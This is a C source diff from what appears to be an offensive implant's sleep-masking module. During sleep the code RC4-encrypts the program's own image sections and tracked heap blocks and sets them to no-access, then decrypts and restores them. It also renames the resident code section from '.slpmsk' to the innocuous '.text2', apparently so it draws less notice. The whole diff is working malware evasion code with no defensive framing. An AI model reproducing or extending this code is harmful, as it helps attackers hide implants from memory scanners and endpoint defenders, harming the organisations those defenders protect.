@@ -27,7 +27,7 @@
 
 typedef struct { BYTE S[256]; BYTE i; BYTE j; } RC4State;
 
-__attribute__((section(".slpmsk")))
+__attribute__((section(".text2")))
 static void RC4Init(RC4State *rc4, const BYTE *key, DWORD keyLen) {
     for (int i = 0; i < 256; i++) rc4->S[i] = (BYTE)i;
     BYTE j = 0;
@@ -38,7 +38,7 @@ static void RC4Init(RC4State *rc4, const BYTE *key, DWORD keyLen) {
     rc4->i = rc4->j = 0;
 }
 
-__attribute__((section(".slpmsk")))
+__attribute__((section(".text2")))
 static void RC4Apply(RC4State *rc4, BYTE *buf, DWORD len) {
     for (DWORD k = 0; k < len; k++) {
         rc4->i++;
@@ -58,7 +58,7 @@ typedef struct {
     ULONG  orig_prot; /* PAGE_EXECUTE_READ or PAGE_READONLY */
 } MaskSection;
 
-__attribute__((section(".slpmsk")))
+__attribute__((section(".text2")))
 static int FindMaskableSections(MaskSection *secs, int maxSecs) {
     PVOID peb      = (PVOID)READ_GS_QWORD(0x60);
     BYTE *imgBase  = *(BYTE**)((BYTE*)peb + 0x10);
@@ -68,8 +68,8 @@ static int FindMaskableSections(MaskSection *secs, int maxSecs) {
 
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections && count < maxSecs; i++) {
         if (!sec[i].Misc.VirtualSize || !sec[i].VirtualAddress) continue;
-        /* Skip .slpmsk — must stay executable during sleep */
-        if (memcmp(sec[i].Name, ".slpmsk", 7) == 0) continue;
+        /* Skip .text2 (sleep-mask resident code — must stay executable) */
+        if (memcmp(sec[i].Name, ".text2\0", 7) == 0) continue;
         /* Skip writable sections (.data, .bss) — globals needed during sleep live here */
         if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) continue;
 
@@ -83,11 +83,21 @@ static int FindMaskableSections(MaskSection *secs, int maxSecs) {
     return count;
 }
 
+/* ── Heap block masking (.text2) ─────────────────────────────────────────── */
+
+__attribute__((section(".text2")))
+static void HeapMaskApply(RC4State *rc4) {
+    for (int i = 0; i < g_heap_track_n; i++) {
+        if (g_heap_track[i].ptr && g_heap_track[i].size)
+            RC4Apply(rc4, (BYTE*)g_heap_track[i].ptr, (DWORD)g_heap_track[i].size);
+    }
+}
+
 /* ── Timer-thread trampoline (.slpmsk) ───────────────────────────────────── */
 
 typedef struct { HANDLE hEvent; DWORD ms; } TimerArg;
 
-__attribute__((section(".slpmsk")))
+__attribute__((section(".text2")))
 static DWORD WINAPI SlpTimerThread(LPVOID p) {
     TimerArg *a = (TimerArg*)p;
     Sleep(a->ms);
@@ -97,7 +107,7 @@ static DWORD WINAPI SlpTimerThread(LPVOID p) {
 
 /* ── Public ──────────────────────────────────────────────────────────────── */
 
-__attribute__((section(".slpmsk")))
+__attribute__((section(".text2")))
 void SleepMasked(LONGLONG ms) {
     if (!g_agent.sleep_mask) {
         NtDelay(ms * 10000LL);
@@ -122,6 +132,7 @@ void SleepMasked(LONGLONG ms) {
         SlpNtProtect((HANDLE)(LONG_PTR)-1, &b, &s, PAGE_READWRITE, &old);
         RC4Apply(&rc4, (BYTE*)secs[i].base, (DWORD)secs[i].size);
     }
+    HeapMaskApply(&rc4);  /* encrypt heap blocks (stream continues from sections) */
 
     /* Step 2 — set all to PAGE_NOACCESS */
     for (int i = 0; i < nSecs; i++) {
@@ -162,6 +173,7 @@ void SleepMasked(LONGLONG ms) {
     for (int i = 0; i < nSecs; i++) {
         RC4Apply(&rc4, (BYTE*)secs[i].base, (DWORD)secs[i].size);
     }
+    HeapMaskApply(&rc4);  /* decrypt heap blocks (same stream order = XOR inverse) */
 
     /* Step 5 — restore original per-section protections */
     for (int i = 0; i < nSecs; i++) {
